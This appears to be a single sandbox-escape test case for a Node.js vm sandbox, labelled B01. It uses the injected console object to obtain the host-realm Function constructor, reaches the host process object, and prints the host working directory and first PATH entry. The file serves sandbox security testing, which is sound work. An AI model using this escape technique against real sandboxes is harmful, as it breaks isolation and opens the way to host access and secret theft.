// Category: cross-realm escape via injected host object.
// console is a HOST-realm object passed into the sandbox; its methods carry
// the host realm Function constructor, which compiles code OUTSIDE the vm.
const hostFunction = console.log.constructor;
const hostProcess = hostFunction("return process")();
console.log("B01-ESCAPED host cwd:", hostProcess.cwd());
const pathHead = (hostProcess.env.PATH ?? "<no PATH>").split(";")[0];
console.log("B01-ESCAPED host PATH[0]:", pathHead);
